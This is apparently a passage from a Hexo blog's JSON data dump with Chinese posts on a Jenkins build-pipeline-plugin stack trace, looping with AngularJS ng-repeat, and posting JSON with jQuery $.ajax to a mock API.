org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:<span class=\"number\">82</span>)</div><div class=\"line\">\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:<span class=\"number\">668</span>)</div><div class=\"line\">\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint$<span class=\"number\">1</span>.run(SelectChannelEndPoint.java:<span class=\"number\">52</span>)</div><div class=\"line\">\tat winstone.BoundedExecutorService$<span class=\"number\">1</span>.run(BoundedExecutorService.java:<span class=\"number\">77</span>)</div><div class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:<span class=\"number\">1156</span>)</div><div class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:<span class=\"number\">626</span>)</div><div class=\"line\">\tat java.lang.Thread.run(Thread.java:<span class=\"number\">804</span>)</div><div class=\"line\">Caused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/hudson/model/View/index.jelly:<span class=\"number\">42</span>:<span class=\"number\">43</span>: &lt;st:include&gt; org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class=\"number\">66</span>:<span class=\"number\">22</span>: &lt;d:invokeBody&gt; <span class=\"keyword\">null</span></div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:<span class=\"number\">726</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">281</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript$<span class=\"number\">1</span>.run(CallTagLibScript.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class=\"number\">91</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">1</span>.run(CoreTagLibrary.java:<span class=\"number\">98</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">2</span>.run(CoreTagLibrary.java:<span class=\"number\">105</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class=\"number\">120</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript$<span class=\"number\">1</span>.run(CallTagLibScript.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class=\"number\">91</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">2</span>.run(CoreTagLibrary.java:<span class=\"number\">105</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class=\"number\">120</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CompressTag.doTag(CompressTag.java:<span class=\"number\">44</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.JellyViewScript.run(JellyViewScript.java:<span class=\"number\">81</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:<span class=\"number\">63</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:<span class=\"number\">53</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:<span class=\"number\">112</span>)</div><div class=\"line\">\t... <span class=\"number\">63</span> more</div><div class=\"line\">Caused by: java.lang.RuntimeException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class=\"number\">66</span>:<span class=\"number\">22</span>: &lt;d:invokeBody&gt; <span class=\"keyword\">null</span></div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:<span class=\"number\">280</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.Namespace$ProxyImpl.invoke(Namespace.java:<span class=\"number\">92</span>)</div><div class=\"line\">\tat com.sun.proxy.$Proxy56.projectView(Unknown Source)</div><div class=\"line\">\tat lib.JenkinsTagLib$projectView.call(Unknown Source)</div><div class=\"line\">\tat hudson.model.View.main.run(main.groovy:<span class=\"number\">14</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:<span class=\"number\">74</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:<span class=\"number\">62</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.IncludeTag.doTag(IncludeTag.java:<span class=\"number\">147</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\t... <span class=\"number\">95</span> more</div><div class=\"line\">Caused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class=\"number\">66</span>:<span class=\"number\">22</span>: &lt;d:invokeBody&gt; <span class=\"keyword\">null</span></div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:<span class=\"number\">726</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">281</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">1</span>.run(CoreTagLibrary.java:<span class=\"number\">98</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">2</span>.run(CoreTagLibrary.java:<span class=\"number\">105</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class=\"number\">120</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:<span class=\"number\">276</span>)</div><div class=\"line\">\t... <span class=\"number\">103</span> more</div><div class=\"line\">Caused by: java.lang.NumberFormatException: <span class=\"keyword\">null</span></div><div class=\"line\">\tat java.lang.Integer.parseInt(Integer.java:<span class=\"number\">465</span>)</div><div class=\"line\">\tat java.lang.Integer.valueOf(Integer.java:<span class=\"number\">593</span>)</div><div class=\"line\">\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getBuildPipelineForm(BuildPipelineView.java:<span class=\"number\">400</span>)</div><div class=\"line\">\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getItems(BuildPipelineView.java:<span class=\"number\">866</span>)</div><div class=\"line\">\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.hasPermission(BuildPipelineView.java:<span class=\"number\">932</span>)</div><div class=\"line\">\tat hudson.model.ViewGroupMixIn.getViews(ViewGroupMixIn.java:<span class=\"number\">115</span>)</div><div class=\"line\">\tat jenkins.model.Jenkins.getViews(Jenkins.java:<span class=\"number\">1444</span>)</div><div class=\"line\">\tat sun.reflect.GeneratedMethodAccessor255.invoke(Unknown Source)</div><div class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class=\"number\">55</span>)</div><div class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:<span class=\"number\">618</span>)</div><div class=\"line\">\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class=\"number\">90</span>)</div><div class=\"line\">\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class=\"number\">233</span>)</div><div class=\"line\">\tat groovy.lang.MetaClassImpl$GetBeanMethodMetaProperty.getProperty(MetaClassImpl.java:<span class=\"number\">3500</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.callsite.GetEffectivePojoPropertySite.getProperty(GetEffectivePojoPropertySite.java:<span class=\"number\">61</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGetProperty(AbstractCallSite.java:<span class=\"number\">227</span>)</div><div class=\"line\">\tat hudson.model.View.main$_run_closure1.doCall(main.groovy:<span class=\"number\">15</span>)</div><div class=\"line\">\tat sun.reflect.GeneratedMethodAccessor382.invoke(Unknown Source)</div><div class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class=\"number\">55</span>)</div><div class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:<span class=\"number\">618</span>)</div><div class=\"line\">\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class=\"number\">90</span>)</div><div class=\"line\">\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class=\"number\">233</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:<span class=\"number\">272</span>)</div><div class=\"line\">\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class=\"number\">903</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.callCurrent(PogoMetaClassSite.java:<span class=\"number\">66</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:<span class=\"number\">141</span>)</div><div class=\"line\">\tat hudson.model.View.main$_run_closure1.doCall(main.groovy)</div><div class=\"line\">\tat sun.reflect.GeneratedMethodAccessor381.invoke(Unknown Source)</div><div class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class=\"number\">55</span>)</div><div class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:<span class=\"number\">618</span>)</div><div class=\"line\">\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class=\"number\">90</span>)</div><div class=\"line\">\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class=\"number\">233</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:<span class=\"number\">272</span>)</div><div class=\"line\">\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class=\"number\">903</span>)</div><div class=\"line\">\tat groovy.lang.Closure.call(Closure.java:<span class=\"number\">415</span>)</div><div class=\"line\">\tat groovy.lang.Closure.call(Closure.java:<span class=\"number\">409</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder$<span class=\"number\">1</span>.run(JellyBuilder.java:<span class=\"number\">264</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript$<span class=\"number\">1</span>.run(CallTagLibScript.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class=\"number\">91</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\t... <span class=\"number\">111</span> more</div></pre></td></tr></table></figure></p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ol>\n<li><p>重启jenkins服务(自己发现的)<br>服务出异常后，发现只要jenkins页面刷新后，jenkins cpu使用率会达到200％+，物理内存占用1.1g，虚拟内存占用2.7g。不知道跟这个异常有没关系。</p>\n</li>\n<li><p>尝试升级build-pipeline-plugin。</p>\n</li>\n<li><p>尝试升级jenkins版本。</p>\n</li>\n</ol>"},{"title":"angularjs循环指定次数","date":"2016-03-13T02:16:00.000Z","_content":"\n<img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" />\n\n\n## 一、js代码\n``` javascript\n$scope.range = function(n) {\n    return new Array(n);\n};\n```\n通过new Array(n)创建指定大小容量的数组。\n\n\n## 二、html代码\n``` html\n<div class=\"list-group-horizontal\">\n  <a ng-repeat=\"i in range(6) track by $index\">\n\t<span ng-bind=\"$index + 1\"></span>\n  </a>\n</div>\n```\n\n遍历数组，并通过track by $index来指定数组索引为$index。\n\n\n## 三、输出结果\n输出结果为：1 2 3 4 5 6\n\n\n## 四、参考文档\n[Way to ng-repeat defined number of times instead of repeating over array?](http://stackoverflow.com/questions/16824853/way-to-ng-repeat-defined-number-of-times-instead-of-repeating-over-array)\n","source":"_posts/article/js/angularjs循环指定次数.md","raw":"title: angularjs循环指定次数\ntags:\n  - angularjs\ncategories:\n  - 前端设计\ndate: 2016-03-13 10:16:00\n---\n\n<img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" />\n\n\n## 一、js代码\n``` javascript\n$scope.range = function(n) {\n    return new Array(n);\n};\n```\n通过new Array(n)创建指定大小容量的数组。\n\n\n## 二、html代码\n``` html\n<div class=\"list-group-horizontal\">\n  <a ng-repeat=\"i in range(6) track by $index\">\n\t<span ng-bind=\"$index + 1\"></span>\n  </a>\n</div>\n```\n\n遍历数组，并通过track by $index来指定数组索引为$index。\n\n\n## 三、输出结果\n输出结果为：1 2 3 4 5 6\n\n\n## 四、参考文档\n[Way to ng-repeat defined number of times instead of repeating over array?](http://stackoverflow.com/questions/16824853/way-to-ng-repeat-defined-number-of-times-instead-of-repeating-over-array)\n","slug":"article/js/angularjs循环指定次数","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxsj003x5nbtxiw4k5ln","content":"<p><img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、js代码\"><a href=\"#一、js代码\" class=\"headerlink\" title=\"一、js代码\"></a>一、js代码</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">$scope.range = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">n</span>) </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(n);</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<p>通过new Array(n)创建指定大小容量的数组。</p>\n<h2 id=\"二、html代码\"><a href=\"#二、html代码\" class=\"headerlink\" title=\"二、html代码\"></a>二、html代码</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"list-group-horizontal\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">ng-repeat</span>=<span class=\"string\">\"i in range(6) track by $index\"</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">ng-bind</span>=<span class=\"string\">\"$index + 1\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>遍历数组，并通过track by $index来指定数组索引为$index。</p>\n<h2 id=\"三、输出结果\"><a href=\"#三、输出结果\" class=\"headerlink\" title=\"三、输出结果\"></a>三、输出结果</h2><p>输出结果为：1 2 3 4 5 6</p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/16824853/way-to-ng-repeat-defined-number-of-times-instead-of-repeating-over-array\" target=\"_blank\" rel=\"external\">Way to ng-repeat defined number of times instead of repeating over array?</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、js代码\"><a href=\"#一、js代码\" class=\"headerlink\" title=\"一、js代码\"></a>一、js代码</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">$scope.range = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">n</span>) </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(n);</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<p>通过new Array(n)创建指定大小容量的数组。</p>\n<h2 id=\"二、html代码\"><a href=\"#二、html代码\" class=\"headerlink\" title=\"二、html代码\"></a>二、html代码</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"list-group-horizontal\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">ng-repeat</span>=<span class=\"string\">\"i in range(6) track by $index\"</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">ng-bind</span>=<span class=\"string\">\"$index + 1\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>遍历数组，并通过track by $index来指定数组索引为$index。</p>\n<h2 id=\"三、输出结果\"><a href=\"#三、输出结果\" class=\"headerlink\" title=\"三、输出结果\"></a>三、输出结果</h2><p>输出结果为：1 2 3 4 5 6</p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/16824853/way-to-ng-repeat-defined-number-of-times-instead-of-repeating-over-array\">Way to ng-repeat defined number of times instead of repeating over array?</a></p>\n"},{"title":"jquery如何传输json数据","date":"2016-04-10T12:19:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jquery.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文阐述基于如下mock接口：\n接口：http://openapi.tencentyun.com/v3/user/delete\n\n| 参数 | 参数说明 |\n|---|---|\n| appid | 应用ID |\n| appkey | 应用密钥 |\n| userid | 用户ID |\n| operid | 操作者ID |\n\n\n## 二、请求删除用户\n\n### 1. 构造请求参数\n``` javascript\nvar params = {\n    \"appid\": \"2\",\n    \"appkey\": \"5F154D7D2751AEDC8527269006F290F70297B7E54667536C\",\n    \"userid\": \"B624064BA065E01CB73F835017FE96FA\",\n    \"operid\": \"B624064BA065E01CB73F835017FE96FA\"\n};\n```\n\n<!-- more -->\n\n### 2. 构造请求\n``` javascript\nvar url = \"http://openapi.tencentyun.com/v3/user/delete\";\n$.ajax({\n    type: \"POST\",\n    url: url,\n    async: false,\n    processData: false,\n    data: JSON.stringify(params),\n    contentType: \"application/json\",\n    dataType: 'json',\n    success: function(json) {\n        console.log(json);\n    }\n});\n```\n\n### 3. 需要注意几个地方\n- contentType设置为：application/json\n- dataType设置为：json\n- data必须是字符串，而不是一个js对象\n\n\n### 4. json对象转字符串\n- 可以对于js自带的JSON.stringify(params)转成字符串\n- 使用jquery的$.param()方法将json对象序列化成键值对\n\n\n## 三、参考文档\n[How can I use JQuery to post JSON data?](http://stackoverflow.com/questions/6255344/how-can-i-use-jquery-to-post-json-data/6255394#6255394)","source":"_posts/article/js/jquery如何传输json数据.md","raw":"title: jquery如何传输json数据\ntags:\n  - jquery\ncategories:\n  - 前端设计\ndate: 2016-04-10 20:19:00\n---\n\n<img src=\"/asserts/images/logo/jquery.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文阐述基于如下mock接口：\n接口：http://openapi.tencentyun.com/v3/user/delete\n\n| 参数 | 参数说明 |\n|---|---|\n| appid | 应用ID |\n| appkey | 应用密钥 |\n| userid | 用户ID |\n| operid | 操作者ID |\n\n\n## 二、请求删除用户\n\n### 1. 构造请求参数\n``` javascript\nvar params = {\n    \"appid\": \"2\",\n    \"appkey\": \"5F154D7D2751AEDC8527269006F290F70297B7E54667536C\",\n    \"userid\": \"B624064BA065E01CB73F835017FE96FA\",\n    \"operid\": \"B624064BA065E01CB73F835017FE96FA\"\n};\n```\n\n<!-- more -->\n\n### 2. 构造请求\n``` javascript\nvar url = \"http://openapi.tencentyun.com/v3/user/delete\";\n$.ajax({\n    type: \"POST\",\n    url: url,\n    async: false,\n    processData: false,\n    data: JSON.stringify(params),\n    contentType: \"application/json\",\n    dataType: 'json',\n    success: function(json) {\n        console.log(json);\n    }\n});\n```\n\n### 3. 需要注意几个地方\n- contentType设置为：application/json\n- dataType设置为：json\n- data必须是字符串，而不是一个js对象\n\n\n### 4. json对象转字符串\n- 可以对于js自带的JSON.stringify(params)转成字符串\n- 使用jquery的$.param()方法将json对象序列化成键值对\n\n\n## 三、参考文档\n[How can I use JQuery to post JSON data?](http://stackoverflow.com/questions/6255344/how-can-i-use-jquery-to-post-json-data/6255394#6255394)","slug":"article/js/jquery如何传输json数据","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxsm00405nbtowaf38az","content":"<p><img src=\"/asserts/images/logo/jquery.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文阐述基于如下mock接口：<br>接口：<a href=\"http://openapi.tencentyun.com/v3/user/delete\" target=\"_blank\" rel=\"external\">http://openapi.tencentyun.com/v3/user/delete</a></p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>参数说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>appid</td>\n<td>应用ID</td>\n</tr>\n<tr>\n<td>appkey</td>\n<td>应用密钥</td>\n</tr>\n<tr>\n<td>userid</td>\n<td>用户ID</td>\n</tr>\n<tr>\n<td>operid</td>\n<td>操作者ID</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"二、请求删除用户\"><a href=\"#二、请求删除用户\" class=\"headerlink\" title=\"二、请求删除用户\"></a>二、请求删除用户</h2><h3 id=\"1-构造请求参数\"><a href=\"#1-构造请求参数\" class=\"headerlink\" title=\"1. 构造请求参数\"></a>1. 构造请求参数</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> params = &#123;</div><div class=\"line\">    <span class=\"string\">\"appid\"</span>: <span class=\"string\">\"2\"</span>,</div><div class=\"line\">    <span class=\"string\">\"appkey\"</span>: <span class=\"string\">\"5F154D7D2751AEDC8527269006F290F70297B7E54667536C\"</span>,</div><div class=\"line\">    <span class=\"string\">\"userid\"</span>: <span class=\"string\">\"B624064BA065E01CB73F835017FE96FA\"</span>,</div><div class=\"line\">    <span class=\"string\">\"operid\"</span>: <span class=\"string\">\"B624064BA065E01CB73F835017FE96FA\"</span></div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"2-构造请求\"><a href=\"#2-构造请求\" class=\"headerlink\" title=\"2. 构造请求\"></a>2. 构造请求</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">\"http://openapi.tencentyun.com/v3/user/delete\"</span>;</div><div class=\"line\">$.ajax(&#123;</div><div class=\"line\">    type: <span class=\"string\">\"POST\"</span>,</div><div class=\"line\">    url: url,</div><div class=\"line\">    <span class=\"keyword\">async</span>: <span class=\"literal\">false</span>,</div><div class=\"line\">    processData: <span class=\"literal\">false</span>,</div><div class=\"line\">    data: <span class=\"built_in\">JSON</span>.stringify(params),</div><div class=\"line\">    contentType: <span class=\"string\">\"application/json\"</span>,</div><div class=\"line\">    dataType: <span class=\"string\">'json'</span>,</div><div class=\"line\">    success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">json</span>) </span>&#123;</div><div class=\"line\">        <span class=\"built_in\">console</span>.log(json);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;);</div></pre></td></tr></table></figure>\n<h3 id=\"3-需要注意几个地方\"><a href=\"#3-需要注意几个地方\" class=\"headerlink\" title=\"3. 需要注意几个地方\"></a>3. 需要注意几个地方</h3><ul>\n<li>contentType设置为：application/json</li>\n<li>dataType设置为：json</li>\n<li>data必须是字符串，而不是一个js对象</li>\n</ul>\n<h3 id=\"4-json对象转字符串\"><a href=\"#4-json对象转字符串\" class=\"headerlink\" title=\"4. json对象转字符串\"></a>4. json对象转字符串</h3><ul>\n<li>可以对于js自带的JSON.stringify(params)转成字符串</li>\n<li>使用jquery的$.param()方法将json对象序列化成键值对</li>\n</ul>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/6255344/how-can-i-use-jquery-to-post-json-data/6255394#6255394\" target=\"_blank\" rel=\"external\">How can I use JQuery to post JSON data?</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/jquery.png\" class=\"img-logo 